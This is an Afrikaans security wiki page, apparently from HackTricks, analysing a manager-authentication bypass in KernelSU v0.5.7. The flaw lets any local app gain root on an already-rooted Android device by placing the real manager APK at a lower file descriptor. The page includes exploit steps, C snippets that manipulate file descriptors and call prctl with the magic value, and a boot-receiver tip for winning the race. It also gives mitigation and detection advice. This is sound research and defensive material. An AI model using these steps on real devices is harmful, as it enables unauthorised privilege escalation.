# Android Rooting Frameworks (KernelSU/Magisk) Bestuurder Auth Bypass & Syscall Hook Misbruik

{{#include ../../banners/hacktricks-training.md}}

Rooting raamwerke soos KernelSU, APatch, SKRoot en Magisk patch dikwels die Linux/Android-kern en stel bevoorregte funksionaliteit bloot aan 'n onbevoegde gebruikersruimte "bestuurder" app via 'n gehookte syscall. As die bestuurder-authentikasie stap gebrekkig is, kan enige plaaslike app hierdie kanaal bereik en voorregte op reeds-grootgemaakte toestelle eskaleer.

Hierdie bladsy abstraheer die tegnieke en valstrikke wat in openbare navorsing ontdek is (veral Zimperium se analise van KernelSU v0.5.7) om beide rooi en blou span te help om aanvaloppervlakke, eksploitasiemiddels, en robuuste versagtings te verstaan.

---
## Argitektuurpatroon: syscall-gehookte bestuurder kanaal

- Kernel module/patch hook 'n syscall (gewoonlik prctl) om "opdragte" van gebruikersruimte te ontvang.
- Protokol is tipies: magic_value, command_id, arg_ptr/len ...
- 'n Gebruikersruimte bestuurder app autentiseer eers (bv., CMD_BECOME_MANAGER). Sodra die kern die oproeper as 'n vertroude bestuurder merk, word bevoorregte opdragte aanvaar:
- Gee root aan oproeper (bv., CMD_GRANT_ROOT)
- Bestuur toelaatlys/ontkenlys vir su
- Pas SELinux beleid aan (bv., CMD_SET_SEPOLICY)
- Vra weergawe/konfigurasie
- Omdat enige app syscalls kan aanroep, is die korrekheid van die bestuurder-authentikasie krities.

Voorbeeld (KernelSU ontwerp):
- Gehookte syscall: prctl
- Magic waarde om na KernelSU handler te lei: 0xDEADBEEF
- Opdragte sluit in: CMD_BECOME_MANAGER, CMD_GET_VERSION, CMD_ALLOW_SU, CMD_SET_SEPOLICY, CMD_GRANT_ROOT, ens.

---
## KernelSU v0.5.7 authentikasie vloei (soos geïmplementeer)

Wanneer gebruikersruimte prctl(0xDEADBEEF, CMD_BECOME_MANAGER, data_dir_path, ...) aanroep, verifieer KernelSU:

1) Pad voorvoegsel kontrole
- Die verskafde pad moet begin met 'n verwagte voorvoegsel vir die oproeper UID, bv. /data/data/<pkg> of /data/user/<id>/<pkg>.
- Verwysing: core_hook.c (v0.5.7) pad voorvoegsel logika.

2) Eienaarskap kontrole
- Die pad moet besit word deur die oproeper UID.
- Verwysing: core_hook.c (v0.5.7) eienaarskap logika.

3) APK handtekening kontrole via FD tabel skandering
- Herhaal die oproep proses se oop lêer beskrywings (FDs).
- Kies die eerste lêer wie se pad ooreenstem met /data/app/*/base.apk.
- Parse APK v2 handtekening en verifieer teen die amptelike bestuurder sertifikaat.
- Verwysings: manager.c (herhaal FDs), apk_sign.c (APK v2 verifikasie).

As al die kontroles slaag, cache die kern die bestuurder se UID tydelik en aanvaar bevoorregte opdragte van daardie UID totdat dit gereset word.

---
## Kwetsbaarheid klas: vertrou "die eerste ooreenstemmende APK" van FD iterasie

As die handtekening kontrole bind aan "die eerste ooreenstemmende /data/app/*/base.apk" wat in die proses FD tabel gevind word, verifieer dit nie eintlik die oproeper se eie pakket nie. 'n Aanvaller kan 'n wettig onderteken APK (die werklike bestuurder se) vooraf posisioneer sodat dit vroeër in die FD lys verskyn as hul eie base.apk.

Hierdie vertroue deur indireksie laat 'n onbevoegde app toe om die bestuurder te verteenwoordig sonder om die bestuurder se onderteken sleutel te besit.

Sleutel eienskappe wat uitgebuit word:
- Die FD skandering bind nie aan die oproeper se pakket identiteit nie; dit pas net pad stringe aan.
- open() gee die laagste beskikbare FD terug. Deur laer-nommer FDs eers te sluit, kan 'n aanvaller die volgorde beheer.
- Die filter kontroleer net dat die pad ooreenstem met /data/app/*/base.apk – nie dat dit ooreenstem met die geïnstalleerde pakket van die oproeper nie.

---
## Aanval voorwaardes

- Die toestel is reeds grootgemaak met 'n kwesbare rooting raamwerk (bv., KernelSU v0.5.7).
- Die aanvaller kan arbitrêre onbevoegde kode plaaslik uitvoer (Android app proses).
- Die werklike bestuurder het nog nie geverifieer nie (bv., reg na 'n herbegin). Sommige raamwerke cache die bestuurder UID na sukses; jy moet die wedloop wen.

---
## Eksploitasiestap (KernelSU v0.5.7)

Hoofstappe:
1) Bou 'n geldige pad na jou eie app data gids om aan die voorvoegsel en eienaarskap kontroles te voldoen.
2) Verseker dat 'n egte KernelSU Bestuurder base.apk op 'n laer-genommerde FD geopen is as jou eie base.apk.
3) Roep prctl(0xDEADBEEF, CMD_BECOME_MANAGER, <your_data_dir>, ...) aan om die kontroles te slaag.
4) Gee bevoorregte opdragte soos CMD_GRANT_ROOT, CMD_ALLOW_SU, CMD_SET_SEPOLICY om die verhoging vol te hou.

Praktiese notas oor stap 2 (FD volgorde):
- Identifiseer jou proses se FD vir jou eie /data/app/*/base.apk deur /proc/self/fd simboliese skakels te loop.
- Sluit 'n lae FD (bv., stdin, fd 0) en open die wettige bestuurder APK eers sodat dit fd 0 beset (of enige indeks laer as jou eie base.apk fd).
- Bundel die wettige bestuurder APK saam met jou app sodat sy pad aan die kern se naïewe filter voldoen. Byvoorbeeld, plaas dit onder 'n subpad wat ooreenstem met /data/app/*/base.apk.

Voorbeeld kode snippette (Android/Linux, illustratief slegs):

Lys oop FDs om base.apk inskrywings te lokaliseer:
```c
#include <dirent.h>
#include <stdio.h>
#include <unistd.h>
#include <string.h>

int find_first_baseapk_fd(char out_path[PATH_MAX]) {
DIR *d = opendir("/proc/self/fd");
if (!d) return -1;
struct dirent *e; char link[PATH_MAX]; char p[PATH_MAX];
int best_fd = -1;
while ((e = readdir(d))) {
if (e->d_name[0] == '.') continue;
int fd = atoi(e->d_name);
snprintf(link, sizeof(link), "/proc/self/fd/%d", fd);
ssize_t n = readlink(link, p, sizeof(p)-1);
if (n <= 0) continue; p[n] = '\0';
if (strstr(p, "/data/app/") && strstr(p, "/base.apk")) {
if (best_fd < 0 || fd < best_fd) {
best_fd = fd; strncpy(out_path, p, PATH_MAX);
}
}
}
closedir(d);
return best_fd; // First (lowest) matching fd
}
```
Dwing 'n laer-nummer FD om na die wettige bestuurder APK te wys:
```c
#include <fcntl.h>
#include <unistd.h>

void preopen_legit_manager_lowfd(const char *legit_apk_path) {
// Reuse stdin (fd 0) if possible so the next open() returns 0
close(0);
int fd = open(legit_apk_path, O_RDONLY);
(void)fd; // fd should now be 0 if available
}
```
Bestuurder verifikasie via prctl haak:
```c
#include <sys/prctl.h>
#include <stdint.h>

#define KSU_MAGIC          0xDEADBEEF
#define CMD_BECOME_MANAGER 0x100  // Placeholder; command IDs are framework-specific

static inline long ksu_call(unsigned long cmd, unsigned long arg2,
unsigned long arg3, unsigned long arg4) {
return prctl(KSU_MAGIC, cmd, arg2, arg3, arg4);
}

int become_manager(const char *my_data_dir) {
long result = -1;
// arg2: command, arg3: pointer to data path (userspace->kernel copy), arg4: optional result ptr
result = ksu_call(CMD_BECOME_MANAGER, (unsigned long)my_data_dir, 0, 0);
return (int)result;
}
```
Na sukses, bevoorregte opdragte (voorbeelde):
- CMD_GRANT_ROOT: bevorder huidige proses na root
- CMD_ALLOW_SU: voeg jou pakket/UID by die toelaatlys vir volhoubare su
- CMD_SET_SEPOLICY: pas SELinux-beleid aan soos deur die raamwerk ondersteun

Wedloop/volhoubaarheid wenk:
- Registreer 'n BOOT_COMPLETED ontvanger in AndroidManifest (RECEIVE_BOOT_COMPLETED) om vroeg na herlaai te begin en probeer verifikasie voordat die werklike bestuurder.

---
## Opsporing en versagting riglyne

Vir raamwerk ontwikkelaars:
- Bind verifikasie aan die oproeper se pakket/UID, nie aan arbitrêre FDs nie:
- Los die oproeper se pakket op vanaf sy UID en verifieer teen die geïnstalleerde pakket se handtekening (via PackageManager) eerder as om FDs te skandeer.
- As slegs op die kern, gebruik 'n stabiele oproeper identiteit (taak krediete) en valideer op 'n stabiele bron van waarheid wat deur init/userspace helper bestuur word, nie proses FDs nie.
- Vermy pad-prefix kontroles as identiteit; dit is triviaal bevredigbaar deur die oproeper.
- Gebruik nonce-gebaseerde uitdaging–antwoord oor die kanaal en maak enige gekapte bestuurder identiteit skoon by opstart of op sleutelgebeurtenisse.
- Oorweeg binder-gebaseerde geverifieerde IPC eerder as om generiese syscalls te oorlaai wanneer dit haalbaar is.

Vir verdedigers/blou span:
- Ontdek die teenwoordigheid van rooting raamwerke en bestuurder prosesse; monitor vir prctl oproepe met verdagte magiese konstantes (bv. 0xDEADBEEF) as jy kern telemetrie het.
- Op bestuurde vloot, blokkeer of waarsku oor opstart ontvangers van onbetroubare pakkette wat vinnig probeer bevoorregte bestuurder opdragte na opstart.
- Verseker dat toestelle opgedateer is na gepatchte raamwerk weergawes; maak gekapte bestuurder ID's ongeldig op opdatering.

Beperkings van die aanval:
- Aangetas slegs toestelle wat reeds ge-root is met 'n kwesbare raamwerk.
- Gewoonlik vereis 'n herlaai/wedloop venster voordat die wettige bestuurder verifieer (sommige raamwerke cache bestuurder UID tot reset).

---
## Verwante notas oor raamwerke

- Wagwoord-gebaseerde verifikasie (bv. historiese APatch/SKRoot bou) kan swak wees as wagwoorde raai-baar/bruteforce-baar is of verifikasies foutief is.
- Pakket/handtekening-gebaseerde verifikasie (bv. KernelSU) is sterker in beginsel maar moet bind aan die werklike oproeper, nie indirekte artefakte soos FD skandeer nie.
- Magisk: CVE-2024-48336 (MagiskEoP) het getoon dat selfs volwasse ekosisteme kwesbaar kan wees vir identiteit vervalsing wat lei tot kode-uitvoering met root binne bestuurder konteks.

---
## Verwysings

- [Zimperium – The Rooting of All Evil: Security Holes That Could Compromise Your Mobile Device](https://zimperium.com/blog/the-rooting-of-all-evil-security-holes-that-could-compromise-your-mobile-device)
- [KernelSU v0.5.7 – core_hook.c path checks (L193, L201)](https://github.com/tiann/KernelSU/blob/v0.5.7/kernel/core_hook.c#L193)
- [KernelSU v0.5.7 – manager.c FD iteration/signature check (L43+)](https://github.com/tiann/KernelSU/blob/v0.5.7/kernel/manager.c#L43)
- [KernelSU – apk_sign.c APK v2 verification (main)](https://github.com/tiann/KernelSU/blob/main/kernel/apk_sign.c#L319)
- [KernelSU project](https://kernelsu.org/)
- [APatch](https://github.com/bmax121/APatch)
- [SKRoot](https://github.com/abcz316/SKRoot-linuxKernelRoot)
- [MagiskEoP – CVE-2024-48336](https://github.com/canyie/MagiskEoP)
- [KSU PoC demo video (Wistia)](https://zimperium-1.wistia.com/medias/ep1dg4t2qg?videoFoam=true)

{{#include ../../banners/hacktricks-training.md}}
